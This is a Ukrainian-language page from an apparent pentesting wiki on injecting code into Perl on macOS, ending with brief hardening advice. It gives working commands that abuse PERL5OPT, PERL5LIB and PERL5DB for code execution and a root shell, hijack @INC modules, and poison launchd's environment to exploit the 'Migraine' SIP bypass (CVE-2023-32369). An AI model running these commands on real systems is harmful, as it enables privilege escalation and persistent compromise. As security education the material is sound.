# macOS Perl Applications Injection

{{#include ../../../banners/hacktricks-training.md}}

## Через змінну середовища `PERL5OPT` & `PERL5LIB`

Використовуючи змінну середовища **`PERL5OPT`**, можливо змусити **Perl** виконувати довільні команди, коли інтерпретатор запускається (навіть **перед** тим, як буде проаналізовано перший рядок цільового скрипта). 
Наприклад, створіть цей скрипт:
```perl:test.pl
#!/usr/bin/perl
print "Hello from the Perl script!\n";
```
Тепер **експортуйте змінну середовища** та виконайте **perl** скрипт:
```bash
export PERL5OPT='-Mwarnings;system("whoami")'
perl test.pl # This will execute "whoami"
```
Інший варіант - створити модуль Perl (наприклад, `/tmp/pmod.pm`):
```perl:/tmp/pmod.pm
#!/usr/bin/perl
package pmod;
system('whoami');
1; # Modules must return a true value
```
А потім використовуйте змінні середовища, щоб модуль був розташований і завантажений автоматично:
```bash
PERL5LIB=/tmp/ PERL5OPT=-Mpmod perl victim.pl
```
### Інші цікаві змінні середовища

* **`PERL5DB`** – коли інтерпретатор запускається з прапором **`-d`** (дебагер), вміст `PERL5DB` виконується як код Perl *всередині* контексту дебагера. Якщо ви можете вплинути як на середовище **так і** на командні прапори привілейованого процесу Perl, ви можете зробити щось на зразок:

```bash
export PERL5DB='system("/bin/zsh")'
sudo perl -d /usr/bin/some_admin_script.pl   # відкриє оболонку перед виконанням скрипту
```

* **`PERL5SHELL`** – у Windows ця змінна контролює, який виконуваний файл оболонки буде використовувати Perl, коли йому потрібно запустити оболонку. Вона згадується тут лише для повноти, оскільки не є актуальною на macOS.

Хоча `PERL5DB` вимагає прапор `-d`, часто можна зустріти скрипти обслуговування або інсталяції, які виконуються як *root* з увімкненим цим прапором для детального усунення неполадок, що робить цю змінну дійсним вектором ескалації.

## Через залежності (@INC зловживання)

Можна перерахувати шлях включення, який Perl буде шукати (**`@INC`**), запустивши:
```bash
perl -e 'print join("\n", @INC)'
```
Типовий вивід на macOS 13/14 виглядає так:
```bash
/Library/Perl/5.30/darwin-thread-multi-2level
/Library/Perl/5.30
/Network/Library/Perl/5.30/darwin-thread-multi-2level
/Network/Library/Perl/5.30
/Library/Perl/Updates/5.30.3
/System/Library/Perl/5.30/darwin-thread-multi-2level
/System/Library/Perl/5.30
/System/Library/Perl/Extras/5.30/darwin-thread-multi-2level
/System/Library/Perl/Extras/5.30
```
Деякі з повернених папок навіть не існують, однак **`/Library/Perl/5.30`** існує, *не* захищена SIP і знаходиться *перед* папками, захищеними SIP. Тому, якщо ви можете записувати як *root*, ви можете помістити шкідливий модуль (наприклад, `File/Basename.pm`), який буде *переважно* завантажений будь-яким привілейованим скриптом, що імпортує цей модуль.

> [!WARNING]
> Вам все ще потрібен **root**, щоб записувати в `/Library/Perl`, і macOS покаже запит **TCC**, що запитує *Повний доступ до диска* для процесу, що виконує операцію запису.

Наприклад, якщо скрипт імплементує **`use File::Basename;`**, буде можливим створити `/Library/Perl/5.30/File/Basename.pm`, що містить код, контрольований атакуючим.

## Обхід SIP через Migration Assistant (CVE-2023-32369 “Migraine”)

У травні 2023 року Microsoft розкрила **CVE-2023-32369**, прозваний **Migraine**, техніку пост-експлуатації, яка дозволяє *root* атакуючому повністю **обійти Захист цілісності системи (SIP)**. Вразливий компонент - це **`systemmigrationd`**, демон, наділений **`com.apple.rootless.install.heritable`**. Будь-який дочірній процес, створений цим демоном, успадковує право і, отже, працює **поза** обмеженнями SIP.

Серед дітей, ідентифікованих дослідниками, є інтерпретатор, підписаний Apple:
```
/usr/bin/perl /usr/libexec/migrateLocalKDC …
```
Оскільки Perl поважає `PERL5OPT` (а Bash поважає `BASH_ENV`), отруєння *оточення* демона достатньо для отримання довільного виконання в контексті без SIP:
```bash
# As root
launchctl setenv PERL5OPT '-Mwarnings;system("/private/tmp/migraine.sh")'

# Trigger a migration (or just wait – systemmigrationd will eventually spawn perl)
open -a "Migration Assistant.app"   # or programmatically invoke /System/Library/PrivateFrameworks/SystemMigration.framework/Resources/MigrationUtility
```
Коли `migrateLocalKDC` запускається, `/usr/bin/perl` стартує з шкідливим `PERL5OPT` і виконує `/private/tmp/migraine.sh` *до повторного ввімкнення SIP*. З цього скрипту ви можете, наприклад, скопіювати корисне навантаження всередину **`/System/Library/LaunchDaemons`** або призначити розширений атрибут `com.apple.rootless`, щоб зробити файл **недоступним для видалення**.

Apple виправила цю проблему в macOS **Ventura 13.4**, **Monterey 12.6.6** та **Big Sur 11.7.7**, але старі або непатчовані системи залишаються вразливими.

## Рекомендації щодо посилення безпеки

1. **Очистіть небезпечні змінні** – привілейовані launchdaemons або cron jobs повинні запускатися в чистому середовищі (`launchctl unsetenv PERL5OPT`, `env -i` тощо).
2. **Уникайте запуску інтерпретаторів від імені root**, якщо це не є строго необхідним. Використовуйте скомпільовані бінарні файли або знижуйте привілеї на ранніх етапах.
3. **Використовуйте скрипти постачальника з `-T` (режим забруднення)**, щоб Perl ігнорував `PERL5OPT` та інші небезпечні параметри, коли перевірка на забруднення увімкнена.
4. **Тримайте macOS в актуальному стані** – “Migraine” повністю виправлено в поточних релізах.

## Посилання

- Microsoft Security Blog – “Нова вразливість macOS, Migraine, може обійти захист цілісності системи” (CVE-2023-32369), 30 травня 2023 року.
- Hackyboiz – “Дослідження обходу SIP в macOS (PERL5OPT & BASH_ENV)”, травень 2025 року.

{{#include ../../../banners/hacktricks-training.md}}
